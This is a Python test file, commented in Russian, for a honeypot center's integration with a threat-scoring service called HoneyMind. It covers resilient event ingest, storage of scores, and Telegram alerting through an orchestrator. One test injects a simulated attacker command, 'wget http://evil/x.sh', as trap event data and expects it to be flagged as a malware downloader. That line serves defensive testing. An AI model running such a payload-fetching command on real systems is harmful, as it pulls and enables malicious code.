"""Интеграция с HoneyMind: оценка событий/сессий не должна ронять приём от агента, а при
threat_score >= 60 должен уйти алерт через существующий канал центр -> оркестратор -> Telegram."""
import json
import uuid

import httpx
import pytest
from sqlalchemy import select

from app import scoring as center_scoring
from app.honeymind import HoneyMind
from app.models import Event, SessionAssessment
from app.orchestrator import Orchestrator

from .conftest import fresh
from .test_center import admin, agent_headers, event, mk_trap  # noqa: F401 (фикстуры/помощники)


class _ImmediateExecutor:
    """Подмена ThreadPoolExecutor в тестах: выполняет задачу синхронно, в вызывающем потоке —
    по тестам не нужно гадать, когда фоновая оценка завершится."""

    def submit(self, fn, *args, **kwargs):
        fn(*args, **kwargs)

        class _DoneFuture:
            def result(self):
                return None

        return _DoneFuture()


@pytest.fixture(autouse=True)
def immediate_scoring(monkeypatch):
    monkeypatch.setattr(center_scoring, "_executor", _ImmediateExecutor())


@pytest.fixture
def honeymind_up(app):
    """HoneyMind, отвечающий заранее заданным вердиктом (без реальной сети)."""
    calls = []
    verdict = {"threat_score": 12, "category": "benign", "is_human": None, "needs_review": False,
               "summary": "Безобидная навигация."}

    def handler(request: httpx.Request):
        calls.append((request.url.path, json.loads(request.content or b"null")))
        if request.url.path == "/session":
            return httpx.Response(200, json={"is_human": True, "human_probability": 0.9,
                                              "human_method": "model", "human_reason": "паузы как у человека",
                                              "script_seen_before": 0})
        return httpx.Response(200, json=verdict)

    settings = app.state.settings.model_copy(update={"honeymind_url": "http://honeymind.internal", "honeymind_token": "t"})
    hm = HoneyMind(settings, transport=httpx.MockTransport(handler))
    app.state.honeymind = hm
    hm.calls = calls
    hm.verdict = verdict
    return hm


@pytest.fixture
def honeymind_down(app, monkeypatch):
    """HoneyMind настроен, но недоступен (timeout/connect error) — и так остаётся после всех retry."""
    def handler(request: httpx.Request):
        raise httpx.ConnectError("boom", request=request)

    settings = app.state.settings.model_copy(update={"honeymind_url": "http://honeymind.internal", "honeymind_token": "t"})
    app.state.honeymind = HoneyMind(settings, transport=httpx.MockTransport(handler))
    monkeypatch.setattr(center_scoring.time, "sleep", lambda _s: None)  # без реальных retry-пауз в тесте
    return app.state.honeymind


@pytest.fixture
def orchestrator_notify(app):
    """Подмена оркестратора: только фиксирует вызовы /api/v1/notify (алерты HoneyMind)."""
    calls = []

    def handler(request: httpx.Request):
        calls.append((request.url.path, json.loads(request.content or b"null")))
        return httpx.Response(200, json={"status": "sent"})

    settings = app.state.settings.model_copy(update={"orchestrator_url": "http://orch:4000", "orchestrator_token": "s3"})
    app.state.orchestrator = Orchestrator(settings, transport=httpx.MockTransport(handler))
    return calls


# --- ingest_events с недоступным HoneyMind: приём не падает, оценка остаётся NULL ---

def test_event_stored_unscored_when_honeymind_down(app, admin, honeymind_down):
    t = mk_trap(admin, name="ssh-bait")
    r = admin.post("/assets/v1/log", json={"events": [event(type="command", command="ls -la")]},
                  headers=agent_headers(t["token"]))
    assert r.status_code == 200 and r.json() == {"ok": 1, "dup": 0}  # приём не падает

    with app.state.session_factory() as db:
        ev = db.scalar(select(Event).where(Event.trap_id == t["id"]))
        assert ev.threat_score is None and ev.category is None and ev.needs_review is None


def test_event_stored_unscored_when_honeymind_not_configured(admin, app):
    """HF_HONEYMIND_URL не задан (по умолчанию) — тоже не должно ничего ронять."""
    assert app.state.honeymind.url == ""
    t = mk_trap(admin, name="ssh-bait")
    r = admin.post("/assets/v1/log", json={"events": [event(type="command", command="ls -la")]},
                  headers=agent_headers(t["token"]))
    assert r.status_code == 200 and r.json() == {"ok": 1, "dup": 0}


def test_log_ingest_survives_honeymind_down_alongside_other_events(app, admin, honeymind_down):
    """Бруфорс-алерт и обычные события продолжают сохраняться, даже если HoneyMind всё время недоступен."""
    t = mk_trap(admin, name="ssh-bait")
    evs = [event(type="auth_attempt", username="root", password=str(i)) for i in range(5)]
    r = admin.post("/assets/v1/log", json={"events": evs}, headers=agent_headers(t["token"]))
    assert r.status_code == 200 and r.json()["ok"] == 5
    with app.state.session_factory() as db:
        assert db.scalar(select(Event).where(Event.type == "alert")) is not None  # бруфорс центра не пострадал


# --- оценка сохраняется, алерт уходит при threat_score >= 60 ---

def test_event_scored_and_fields_exposed_in_api(app, admin, honeymind_up):
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="command", command="ls -la")]},
              headers=agent_headers(t["token"]))
    items = admin.get("/api/events").json()["items"]
    assert items[0]["threat_score"] == 12 and items[0]["category"] == "benign" and items[0]["needs_review"] is False


def test_high_threat_score_triggers_telegram_alert(app, admin, honeymind_up, orchestrator_notify):
    honeymind_up.verdict["threat_score"] = 95
    honeymind_up.verdict["category"] = "malware_downloader"
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="command", command="wget http://evil/x.sh")]},
              headers=agent_headers(t["token"]))
    notified = [c for c in orchestrator_notify if c[0].startswith("/api/v1/notify")]
    assert len(notified) == 1
    assert notified[0][1]["properties"]["threat_score"] == 95
    assert notified[0][1]["properties"]["category"] == "malware_downloader"


def test_auth_attempt_does_not_duplicate_bruteforce_alert(app, admin, honeymind_up, orchestrator_notify):
    """Для auth_attempt уже есть алерт center (перебор паролей) — HoneyMind не должен слать второй,
    даже если сам оценил событие как опасное."""
    honeymind_up.verdict["threat_score"] = 80
    honeymind_up.verdict["category"] = "credential_attempt"
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="auth_attempt", username="root", password="123456")]},
              headers=agent_headers(t["token"]))
    assert orchestrator_notify == []  # ни алерта о бруфорсе (один неудачный вход), ни алерта HoneyMind


def test_session_end_triggers_is_human_assessment(app, admin, honeymind_up):
    t = mk_trap(admin, name="ssh-bait")
    sid = uuid.uuid4().hex
    evs = [event(type="command", command="ls", session_id=sid),
           event(type="command", command="cd /tmp", session_id=sid),
           event(type="session_end", session_id=sid)]
    admin.post("/assets/v1/log", json={"events": evs}, headers=agent_headers(t["token"]))

    assert admin.get(f"/api/sessions/{sid}").json()["is_human"] is True
    with app.state.session_factory() as db:
        a = db.get(SessionAssessment, sid)
        assert a.human_method == "model" and a.script_seen_before == 0


def test_session_not_assessed_returns_404(admin):
    assert admin.get("/api/sessions/unknown-session").status_code == 404
